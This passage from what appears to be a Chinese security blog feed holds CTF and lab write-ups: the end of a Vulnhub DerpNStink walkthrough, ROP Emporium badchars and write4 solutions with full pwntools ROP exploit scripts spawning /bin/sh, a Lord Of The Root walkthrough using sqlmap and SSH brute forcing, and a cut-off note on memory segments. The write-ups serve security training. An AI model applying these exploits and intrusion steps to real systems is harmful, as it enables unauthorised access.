src="/img/DerpNStink/DerpNStink8.png"></p><p>找到数据库界面的地址。还找到一个新的界面，如提示所说的WordPress搭建的Blog。</p><p><img src="/img/DerpNStink/DerpNStink9.png"></p><p><img src="/img/DerpNStink/DerpNStink10.png"></p><p>通过wpscan扫描发现了该站点使用了plugin：</p><p><img src="/img/DerpNStink/DerpNStink11.png"></p><p>以及该站点的用户：</p><p><img src="/img/DerpNStink/DerpNStink12.png"></p><h2 id="Step-4"><a href="#Step-4" class="headerlink" title="Step 4"></a>Step 4</h2><p>一般wordpress靶机装了插件的，基本都会有插件漏洞，找了一下：</p><p><img src="/img/DerpNStink/DerpNStink13.png"></p><p>果然，版本也完美匹配，应该就是这个漏洞了，去找一下利用工具：</p><p><img src="/img/DerpNStink/DerpNStink14.png"></p><p>可是看下利用模块，需要一个wordpress的账户和密码：</p><p><img src="/img/DerpNStink/DerpNStink15.png"></p><p>只能结合枚举出来的两个用户尝试爆破了：</p><p><img src="/img/DerpNStink/DerpNStink16.png"></p><p>居然admin&#x2F;admin……行吧。万事俱备，MSF走起：</p><p><img src="/img/DerpNStink/DerpNStink17.png"></p><p>成功获得shell，尝试了下直接找flag文件没有找到，那只能看一些敏感文件获取更多的信息，在wp-config.php文件里找到数据库登录名和密码：</p><p><img src="/img/DerpNStink/DerpNStink18.png"></p><p>结合之前目录爆破找到的phpmyadmin地址登录到数据库中，找到flag2：</p><p><img src="/img/DerpNStink/DerpNStink19.png"></p><h2 id="Step-5"><a href="#Step-5" class="headerlink" title="Step 5"></a>Step 5</h2><p>同时在user表中获得两个账户的密码：</p><p><img src="/img/DerpNStink/DerpNStink20.png"></p><p>尝试破解密码：</p><p><img src="/img/DerpNStink/DerpNStink21.png"></p><p>root破解出来当然就是admin，unclestinky密码破解出来是wedgie57：</p><p><img src="/img/DerpNStink/DerpNStink22.png"></p><p>尝试了ssh发现不行，突然想起来还有个ftp服务，那么getshell？好像我们已经拿过shell了，也许是个高权限的shell？呵，发现3.0.4版本没有远程命令执行漏洞……尴尬，还以为自己早就未卜先知了&#x3D;&#x3D;</p><p>那就正常登录看看有什么，用unclestinky账户登录一直失败，想起来webnotes&#x2F;info.txt界面又个账户名叫stinky，异想天开的用这个试了一下，然后就进去了&#x3D;&#x3D;</p><p>在里面找到一段对话：</p><p><img src="/img/DerpNStink/DerpNStink23.png"></p><p>然后进了无数个ssh文件夹之后找到一个key.txt：</p><p><img src="/img/DerpNStink/DerpNStink24.png"></p><p>ssh的登录凭证，总算找到了一点东西了。用这个凭证登录ssh：</p><p><img src="/img/DerpNStink/DerpNStink25.png"></p><p>好吧，<code>chmod 600 key.txt</code>去掉其他用户的read权限后再次登陆：</p><p><img src="/img/DerpNStink/DerpNStink26.png"></p><p>终于进来了，找下有什么东西，首先是flag3:</p><p><img src="/img/DerpNStink/DerpNStink27.png"></p><p>还有一个pcap文件：</p><p><img src="/img/DerpNStink/DerpNStink28.png"></p><h2 id="Step-6"><a href="#Step-6" class="headerlink" title="Step 6"></a>Step 6</h2><p>下载到本地看下是什么：</p><p><img src="/img/DerpNStink/DerpNStink29.png"></p><p>用wireshark打开发现是一段时间内的数据包，根据pcap包的名字结合之前在ftp里找到的那段对话，不难发现这段数据包中可能包含mrderp修改的账号和密码信息。</p><p>在pcap文件中寻找一番，终于发现了用户名和密码：</p><p><img src="/img/DerpNStink/DerpNStink30.png"></p><p>经过尝试发现该用户名和密码可以登录ssh服务：</p><p><img src="/img/DerpNStink/DerpNStink31.png"></p><p>通过<code>sudo -l</code>命令查看有什么可以利用的提权方式：</p><p><img src="/img/DerpNStink/DerpNStink32.png"></p><p>得知mrderp用户可以通过sudo命令在&#x2F;home&#x2F;mrderp&#x2F;binaries&#x2F;文件下执行derpy*的命令。所以我们创建binaries文件夹：</p><p><img src="/img/DerpNStink/DerpNStink33.png"></p><p>再创建derpy.sh文件，向里面写入：</p><p><img src="/img/DerpNStink/DerpNStink34.png"></p><p>最后赋予该文件执行权限后通过sudo执行即可获取root权限：</p><p><img src="/img/DerpNStink/DerpNStink35.png"></p><p>最终找到flag.txt文件：</p><p><img src="/img/DerpNStink/DerpNStink36.png"></p><p>至此，该靶机4个flag已经全部找到。</p>]]></content>
      
      
      <categories>
          
          <category> WriteUPs </category>
          
          <category> Vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> DC Series </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ROP Emporium の badchars</title>
      <link href="/2020/06/05/badchars/"/>
      <url>/2020/06/05/badchars/</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p><a href="https://ropemporium.com/">ROP Emporium</a>训练4：badchars的解析。</p><span id="more"></span><h2 id="badchars32"><a href="#badchars32" class="headerlink" title="badchars32"></a>badchars32</h2><h3 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h3><p>程序正常运行截图：</p><p><img src="/img/badchars/badchars1.png"></p><p>可以看到运行时提示badchars，结合题目说明，可能这些字符串会被程序特殊处理。</p><p>checksec：32位程序，依然只开启了DEP保护</p><p><img src="/img/badchars/badchars2.png"></p><h3 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h3><p>将程序丢到IDA Pro中去（至于为什么没用hopper，只能说这题需要理解下程序，而hopper的伪代码不够C……），先看下main函数：</p><p><img src="/img/badchars/badchars3.png"></p><p>main函数聚焦在pwnme函数:</p><p><img src="/img/badchars/badchars4.png"></p><p>首先发现memcpy函数存在栈溢出漏洞，其次出现了两个函数nstrlen和checkBadchars：</p><p><img src="/img/badchars/badchars5.png"></p><p>nstrlen函数是当遇到0xa（ASII码10即’\n’）时就截断。</p><p><img src="/img/badchars/badchars6.png"></p><p>checkBadchars函数是遇到\x62（ASII码98即’b’）、\x69（ASII码105即’i’）、\x63（ASII码99即’c’）、\x2f（ASII码47即’&#x2F;‘）、\x20（ASII码32即’<space>‘）、\x66（ASII码102即’f’）、\x6e（ASII码110即’n’）、\x73（ASII码115即’s’）时将其替换成’-21’。</p><p>还发现程序中是存在system函数的，但是没有’&#x2F;bin&#x2F;sh’字符串。所以我们需要将需要的字符串写入内存，这样就会遇到’&#x2F;’、’b’、’s’被过滤的情况。</p><p>为了解决这个情况，根据题目的提示，需要通过XOR（异或）对输入的字符串加密后输入然后再解密。</p><h3 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h3><p>顺着这个思路首先解决第一个问题，字符串写到哪里。看一下各个段的权限，下面的段是有写权限的：</p><p><img src="/img/badchars/badchars7.png"></p><p>.bss段是空的所以可以把字符串写在.bss段。</p><p>然后是第二个问题怎么实现异或，通过ROPgadget找一下：</p><p><img src="/img/badchars/badchars8.png"></p><p>果然在0x08048890这里存在这样一条XOR指令可以利用。通过这条指令我们可以将XOR后的’&#x2F;bin&#x2F;sh’字符串传入，通过这条指令解密后再作为system函数的参数。</p><p>接着是XOR值的选择，我们可以写个简单的脚本找一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">badchars = <span class="string">&#x27;\x62\x69\x63\x2f\x20\x66\x6e\x73&#x27;</span></span><br><span class="line"></span><br><span class="line">sh_string = <span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">sh_str</span>):</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(sh_str)):</span><br><span class="line">        tmp = <span class="built_in">chr</span>(<span class="built_in">ord</span>(sh_str[j]) ^ i)</span><br><span class="line">        <span class="keyword">if</span> tmp <span class="keyword">in</span> badchars:</span><br><span class="line">            i = i + <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span> i</span><br><span class="line"></span><br><span class="line">xor(sh_string)</span><br></pre></td></tr></table></figure><p>运行结果为2，即当’&#x2F;bin&#x2F;sh\x00’和2异或的时候不会出现被过滤的字符。</p><p>当然还需要找一个指令段帮助控制ebx和cl寄存器（32位的ecx寄存器分为两个16位的cx寄存器，cx寄存器再分成8位的ch和cl寄存器）的值，也通过ROPgadget找一下：</p><p><img src="/img/badchars/badchars9.png"></p><p>最后就是找两个指令段，分别辅助写入和控制寄存器：</p><p><img src="/img/badchars/badchars10.png"></p><p>图中标记的一对指令刚好满足条件。</p><h3 id="Step-4"><a href="#Step-4" class="headerlink" title="Step 4"></a>Step 4</h3><p>思路顺利之后就是写EXP了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">* <span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">* </span><br><span class="line">* sh = process(<span class="string">&#x27;./badchars32&#x27;</span>)</span><br><span class="line">* elf = ELF(<span class="string">&#x27;./badchars32&#x27;</span>)</span><br><span class="line">* </span><br><span class="line">* sys_addr = elf.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">* bss_addr = <span class="number">0x0804a040</span></span><br><span class="line">* </span><br><span class="line">* xor_addr = <span class="number">0x08048890</span></span><br><span class="line">* <span class="comment">#pop_ebx_addr = 0x08048461</span></span><br><span class="line">* <span class="comment">#pop_ecx_addr = 0x08048897</span></span><br><span class="line">* pop_ebx_ecx_addr = <span class="number">0x08048896</span></span><br><span class="line">* </span><br><span class="line">* mov_addr = <span class="number">0x08048893</span></span><br><span class="line">* pop_addr = <span class="number">0x08048899</span></span><br><span class="line">* </span><br><span class="line">* shell = <span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">* xor_shell = <span class="string">&#x27;&#x27;</span></span><br><span class="line">* <span class="keyword">for</span> i <span class="keyword">in</span> shell:</span><br><span class="line">* xor_shell += <span class="built_in">chr</span>(<span class="built_in">ord</span>(i) ^ <span class="number">2</span>)</span><br><span class="line">* </span><br><span class="line">* payload = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x28</span> + <span class="number">0x4</span>)</span><br><span class="line">* payload += p32(pop_addr) + xor_shell[<span class="number">0</span>:<span class="number">4</span>] + p32(bss_addr) + p32(mov_addr)</span><br><span class="line">* payload += p32(pop_addr) + xor_shell[<span class="number">4</span>:<span class="number">8</span>] + p32(bss_addr + <span class="number">4</span>) + p32(mov_addr)</span><br><span class="line">* </span><br><span class="line">* <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(xor_shell)):</span><br><span class="line">* <span class="comment">#payload += p32(pop_ebx_addr)</span></span><br><span class="line">* <span class="comment">#payload += p32(bss_addr + j)</span></span><br><span class="line">* <span class="comment">#payload += p32(pop_ecx_addr)</span></span><br><span class="line">* payload += p32(pop_ebx_ecx_addr)</span><br><span class="line">* payload += p32(bss_addr + j)</span><br><span class="line">* payload += p32(<span class="number">2</span>)</span><br><span class="line">* payload += p32(xor_addr)</span><br><span class="line">* </span><br><span class="line">* payload += p32(sys_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(bss_addr)</span><br><span class="line">* </span><br><span class="line">* sh.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">* sh.sendline(payload)</span><br><span class="line">* </span><br><span class="line">* sh.interactive()</span><br><span class="line">* sh.close()</span><br></pre></td></tr></table></figure><p>注释掉的部分是在传入的XOR加密shellcode解密时候，将xor指令的传参分成两步进行，可是却无法正确getshell，希望有大佬可以解惑。</p><p>EXP运行结果：</p><p><img src="/img/badchars/badchars11.png"></p><h2 id="badchars"><a href="#badchars" class="headerlink" title="badchars"></a>badchars</h2><p>64位程序和32位思路一样，传参的时候甚至更加简单，因为可以一次性将需要的字符串写入内存。</p><h2 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h2><p>写入的字符串可以是’sh\x00\x00’，这样32位程序也可以实现一次性传参，前提是sh系统变量就是默认的’&#x2F;bin&#x2F;sh’命令。</p>]]></content>
      
      
      <categories>
          
          <category> WriteUPs </category>
          
          <category> ROP Emporium </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> Stack </tag>
            
            <tag> ROP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub - Lord Of The Root の Write-Up</title>
      <link href="/2020/06/03/LordOfTheRoot/"/>
      <url>/2020/06/03/LordOfTheRoot/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><a href="https://www.vulnhub.com/">Vulnhub</a>之<a href="https://www.vulnhub.com/entry/lord-of-the-root-101,129/">Lord Of The Root</a>的Write-up。</p><span id="more"></span><h2 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h2><p>寻找靶机地址：</p><p><img src="/img/LordOfTheRoot/LordOfTheRoot1.png"></p><p>扫描开放的端口和服务：</p><p><img src="/img/LordOfTheRoot/LordOfTheRoot2.png"></p><p>扫描结果提示OSScan results may be unreliable because we could not find at least 1 open and 1 closed port，可能是靶机做了针对操作系统检测的防范。</p><h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h2><p>扫描结果只有一个22端口，只能先尝试登录：</p><p><img src="/img/LordOfTheRoot/LordOfTheRoot3.png"></p><p>ssh登录提示上面的界面，猜测是端口敲门，这点在<a href="https://coldwave96.github.io/2020/05/06/DC-9/#Step-4">DC-9靶机</a>中也有涉及到。</p><p>所以我们通过<code>knock 172.16.83.138 1 2 3</code>命令实现端口敲门，然后再次扫描靶机开放的端口：</p><p><img src="/img/LordOfTheRoot/LordOfTheRoot4.png"></p><p>果然多了一个1337端口，访问之后发现就是一张简单的图片：</p><p><img src="/img/LordOfTheRoot/LordOfTheRoot5.png"></p><p>尝试下爆破网站目录，发现&#x2F;images目录下有3张照片，robots.txt文件中有一段奇怪的字符串：</p><p><img src="/img/LordOfTheRoot/LordOfTheRoot6.png"></p><p>这是base64加密的字符串，揭秘后得到：Lzk3ODM0NTIxMC9pbmRleC5waHA&#x3D; Closer!</p><p>但是前半部分依然是base64加密的字符串，再次解密得到：&#x2F;978345210&#x2F;index.php</p><p>访问这个界面看到一个登录框：</p><p><img src="/img/LordOfTheRoot/LordOfTheRoot7.png"></p><h2 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h2><p>通过sqlmap的注入发现这里存在注入漏洞：</p><p><img src="/img/LordOfTheRoot/LordOfTheRoot8.png"></p><p>在Webapp数据库里发现Users表：</p><p><img src="/img/LordOfTheRoot/LordOfTheRoot9.png"></p><p>User表里找到5个用户的账户和密码:</p><p><img src="/img/LordOfTheRoot/LordOfTheRoot10.png"></p><p>用这5个账户密码登录之前的界面，全部跳转到同一个profile.php界面，而这个界面不用输入任何账户名和密码直接点击登录就可以跳转，所以这5个账户名和密码不是用在这里的。</p><p>将这5个账户名和密码用于爆破22端口ssh服务：</p><p><img src="/img/LordOfTheRoot/LordOfTheRoot11.png"></p><p>用找到的账户ssh登录成功：</p><p><img src="/img/LordOfTheRoot/LordOfTheRoot12.png"></p><h2 id="Step-4"><a href="#Step-4" class="headerlink" title="Step 4"></a>Step 4</h2><p>下一步就是提权了。使用sudo -l命令提示该用户没有sudo权限，这样SUID提权方法就无法使用了：</p><p><img src="/img/LordOfTheRoot/LordOfTheRoot13.png"></p><p>找了下资料，大佬给了2个工具网站：</p><ul><li><p><a href="http://pentestmonkey.net/tools/audit/unix-privesc-check">unix-privesc-check</a></p></li><li><p><a href="https://www.securitysift.com/download/linuxprivchecker.py">linuxprivchecker</a></p></li></ul><p>这两个脚本将细致的检测许多可导致提权的配置问题，我们选一个尝试一下。将脚本下载到靶机上，然后运行：</p><p><img src="/img/LordOfTheRoot/LordOfTheRoot14.png"></p><p>脚本最后反馈了一个很眼熟的信息：</p><p><img src="/img/LordOfTheRoot/LordOfTheRoot15.png"></p><p>这不是MySQL的udf提权么，之前在<a href="https://coldwave96.github.io/2020/05/25/Raven-1/#P-S">Raven1</a>中详细谈论过，步骤基本一致，有兴趣的可自行动手尝试。</p><p>关于MySQL数据库root账户的密码我们可以通过sqlmap在mysql数据库的user表中找到。</p>]]></content>
      
      
      <categories>
          
          <category> WriteUPs </category>
          
          <category> Vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ROP Emporium の write4</title>
      <link href="/2020/06/02/write4/"/>
      <url>/2020/06/02/write4/</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p><a href="https://ropemporium.com/">ROP Emporium</a>训练3：write4的解析。</p><span id="more"></span><h2 id="write432"><a href="#write432" class="headerlink" title="write432"></a>write432</h2><h3 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h3><p>程序正常运行截图：</p><p><img src="/img/write4/write4-1.png"></p><p>checksec：32位程序，只开启了DEP保护,依然是用ROP Chain解决DEP保护的问题</p><p><img src="/img/write4/write4-2.png"></p><h3 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h3><p>把程序丢到hopper中看下，发现依然有pwnme函数，依然是fgets函数存在溢出漏洞。</p><p><img src="/img/write4/write4-3.png"></p><p>同时程序中程序中依然存在system函数，可以执行系统命令：</p><p><img src="/img/write4/write4-4.png"></p><p>以及一个usefulFunction函数：</p><p><img src="/img/write4/write4-5.png"></p><p>但是函数只能看到有什么文件而无法看到flag.txt文件里有什么内容。</p><p>有了system函数我们就想着去找’&#x2F;bin&#x2F;sh’或者’&#x2F;bin&#x2F;cat flag.txt’字符串：</p><p><img src="/img/write4/write4-6.png"></p><p>意料之中的啥也没有，那么在结合题目给我们的提示，可能我们得自己往内存中写入‘bin&#x2F;sh’字符串。</p><h3 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h3><p>找一下系统中的段，把数据写入.data或者.bss的段中去：</p><p><img src="/img/write4/write4-7.png"></p><p>看了下这两个段发现均无任何数据且均具有写权限所以写到任意那个地方都是可以的，只要内存区域的大小够即可：</p><p><img src="/img/write4/write4-8.png"></p><p>下一步就要考虑怎么写数据，在程序的函数中发现这样一个有趣的函数：</p><p><img src="/img/write4/write4-9.png"></p><p>通过这个函数我们可以向内存中写入数据，但是我们还需要一个指令段控制edi和ebp，所以通过ROPgadget找一下：</p><p><img src="/img/write4/write4-10.png"></p><h3 id="Step-4"><a href="#Step-4" class="headerlink" title="Step 4"></a>Step 4</h3><p>整个ROP Chain的构造及运行示意图如下：</p><p><img src="/img/write4/write4-11.png"></p><p>最后就是构造payload了，32位程序还有一点需要注意就是每次只能写入dword也就是4字节，所以’&#x2F;bin&#x2F;sh’需要分成两次写入，下面直接给出EXP脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">* <span class="comment"># coding:utf-8</span></span><br><span class="line">* <span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">* </span><br><span class="line">* sh = process(<span class="string">&#x27;./write432&#x27;</span>)</span><br><span class="line">* elf = ELF(<span class="string">&#x27;./write432&#x27;</span>)</span><br><span class="line">* </span><br><span class="line">* bss_addr = <span class="number">0x0804a040</span> <span class="comment">#.bss段开始的地址</span></span><br><span class="line">* sys_addr = elf.symbols[<span class="string">&#x27;system&#x27;</span>] <span class="comment">#system函数入口地址</span></span><br><span class="line">* mov_addr = <span class="number">0x08048670</span> <span class="comment">#把字符串写入.bss段的sub_8048670函数入口地址即mov dword [edi], ebp ; ret</span></span><br><span class="line">* pop_addr = <span class="number">0x080486da</span> <span class="comment">#控制edi和ebp指令段地址即pop edi ; pop ebp ; ret</span></span><br><span class="line">* </span><br><span class="line">* payload = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x28</span> + <span class="number">0x4</span>) <span class="comment">#padding</span></span><br><span class="line">* payload += p32(pop_addr) + p32(bss_addr) + <span class="string">&#x27;/bin&#x27;</span> + p32(mov_addr) <span class="comment">#第一次写入</span></span><br><span class="line">* payload += p32(pop_addr) + p32(bss_addr+ <span class="number">4</span>) + <span class="string">&#x27;/sh\0&#x27;</span> + p32(mov_addr) <span class="comment">#第二次写入，注意截断符(‘\0’或者‘\x00’都可以）</span></span><br><span class="line">* payload += p32(sys_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(bss_addr) <span class="comment">#调用system函数执行/bin/sh</span></span><br><span class="line">* </span><br><span class="line">* sh.recvuntil(<span class="string">&#x27;&gt;&#x27;</span>)</span><br><span class="line">* sh.sendline(payload)</span><br><span class="line">* </span><br><span class="line">* sh.interactive()</span><br><span class="line">* sh.close()</span><br></pre></td></tr></table></figure><p>EXP运行截图：</p><p><img src="/img/write4/write4-12.png"></p><h2 id="write4"><a href="#write4" class="headerlink" title="write4"></a>write4</h2><p>64位程序和32位程序基本一致，只不过在传入数据的时候可以一次性传入’&#x2F;bin&#x2F;sh\0’，这样更加简单。</p><p>其他的部分和32位程序毫无差别，有兴趣可自行尝试，这里就不详细赘述了。</p><h2 id="P-S"><a href="#P-S" class="headerlink" title="P.S."></a>P.S.</h2><p>也许会纳闷在程序中有一个usefulFunction的函数，执行的是‘&#x2F;bin&#x2F;ls’的命令。那么既然本题我们可以向内存中写入字符串，那么是否可以修改这个函数的命令实现get shell呢。</p><p>实际是不可以的，因为在程序中我们可以看到这个函数中的参数放在.rodata这个段，顾名思义这是read only的数据段，是没有写入权限的，所以无法通过修改usefulFunction函数的参数实现。</p><p><img src="/img/write4/write4-13.png"></p><p><img src="/img/write4/write4-14.png"></p>]]></content>
      
      
      <categories>
          
          <category> WriteUPs </category>
          
          <category> ROP Emporium </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> Stack </tag>
            
            <tag> ROP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一些概念</title>
      <link href="/2020/06/01/concepts/"/>
      <url>/2020/06/01/concepts/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在刷ROP题的时候涉及到将字符串写入内存的问题，学习过程中需要更加细致的了解一些概念，简单的记录一下自己的理解。</p><span id="more"></span><h2 id="内存区域"><a href="#内存区域" class="headerlink" title="内存区域"></a>内存区域</h2><p>简单的了解一下内存中的一些区域：</p><ul><li><p>栈（stack）：由编译器自动分配及释放，存放着函数的参数值、局部变量的值等。</p></li><li><p>堆（heap）：一般是由程序员通过相应的函数分配和释放，若程序员不释放，程序结束可能由OS回收。</p></li><li><p>全局区（静态区，static）：全局变量和静态变量的存储是放在一块的，初始化的全局变量和静态变量在一块区域（.data段，data segment），未初始化的全局变量和未初始化的静态变量在相邻的另一块区域（.bss段，bss segment）。程序结束后由系统释放。</p></li><li><p>文字常量区：存放文字等不可修改的常量，由系统分配和释放。</p></li><li><p>程序代码区：存放程序编译连接后生成的二进制机器码指令。</p></li></ul><p>下面是一个例子了解这些区域：</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#include&lt;stdio.h&gt;</span></span><br><span class="line"><span class="meta">#include&lt;stdlib.h&gt;</span></span><br><span class="line"><span class="meta">#include&lt;iostream&gt;</span></span><br><span class="line"><span class="meta">#include&lt;string.h&gt;</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="title">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="built_in">int</span> a=<span class="number">1</span>; <span class="comment">//全局初始化区 </span></span><br><span class="line"><span class="built_in">int</span> b=<span class="number">2</span>; <span class="comment">//全局初始化区 </span></span><br><span class="line"><span class="built_in">char</span> *p; <span class="comment">//全局未初始化区 </span></span><br><span class="line"><span class="built_in">char</span> *p2; <span class="comment">//全局未初始化区 </span></span><br><span class="line"><span class="built_in">int</span> *p3; <span class="comment">//全局未初始化区 </span></span><br><span class="line"><span class="built_in">int</span> *p4; <span class="comment">//全局未初始化区 </span></span><br><span class="line"><span class="built_in">char</span> *p5=&#123;<span class="string">&quot;555555555&quot;</span>&#125;; <span class="comment">//全局初始化区 </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="built_in">int</span> <span class="title">main</span>()</span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="built_in">int</span> c=<span class="number">3</span>;</span><br><span class="line">    <span class="built_in">int</span> d=<span class="number">4</span>; <span class="comment">//内存栈</span></span><br><span class="line">    <span class="built_in">int</span> e=<span class="number">7</span>; <span class="comment">//内存栈</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">char</span> *p6=&#123;<span class="string">&quot;555555555&quot;</span>&#125;;</span><br><span class="line">    p=(<span class="built_in">char</span>*)malloc(<span class="keyword">sizeof</span>(<span class="built_in">char</span>)*<span class="number">10</span>); <span class="comment">//内存堆</span></span><br><span class="line">    p2=(<span class="built_in">char</span>*)malloc(<span class="keyword">sizeof</span>(<span class="built_in">char</span>)*<span class="number">10</span>); <span class="comment">//内存堆</span></span><br><span class="line">    p3=(<span class="built_in">int</span>*)malloc(<span class="keyword">sizeof</span>(<span class="built_in">int</span>)); <span class="comment">//内存堆</span></span><br><span class="line">    p4=(<span class="built_in">int</span>*)malloc(<span class="keyword">sizeof</span>(<span class="built_in">int</span>)*<span class="number">10</span>); <span class="comment">//内存堆</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="built_in">int</span> i=<span class="number">0</span>;i&lt;=<span class="number">9</span>;i++)p4[i]=<span class="number">0x1</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    *p3=<span class="number">0x123</span>;</span><br><span class="line">    strcpy(p,<span class="string">&quot;123456789&quot;</span>); <span class="comment">//文字常量区</span></span><br><span class="line">    strcpy(p2,<span class="string">&quot;987654321&quot;</span>);</span><br><span class="line">    strcpy(p2,<span class="string">&quot;123456789&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关于这些内存区域的一些说明：</p><ul><li><p>全局初始化区与全局（静态）初始化区是在同一段内存连续分配的，按内存地址增长方向分配</p></li><li><p>全局初始化区与全局未初始化区不在同一段内存区</p></li><li><p>栈空间也是同一段内存连续分配的，按内存地址减小方向分配</p></li><li><p>堆空间也是同一段内存连续分配的，按内存地址增大方向分配</p></li><li><p>文字常量区在自己特有的内存段内，且有机制控制字符常量不被修改（当字符串相同的时候，系统有时还会将两个指针指向同一处）</p></li><li><p>在文字常量区的字符串不可以被修改，而在内存堆空间的字符串可以被修改</p></li></ul><h2 id="bss段和data段"><a href="#bss段和data段" class="headerlink" title="bss段和data段"></a>bss段和data段</h2><p>bss段（Block Started by Symbol segment）通常是指用来存放程序中未初始化的全局变量的一块内存区域，一般在初始化时bss 段部分将会清零（bss段属于静态内存分配，即程序一开始就将其清零了）。比如，在C程序编译完成之后，已初始化的全局变量保存在.data 段中，未初始化的全局变量保存在.bss段中。</p><p>text（二进制机器代码段）和data段都在可执行文件中（在嵌入式系统里一般是固化在镜像文件中），由系统从可执行文件中加载；而bss段不在可执行文件中（不占用exe的空间，只标记空间大小），由系统初始化。</p><p>看一下这样两个程序：</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 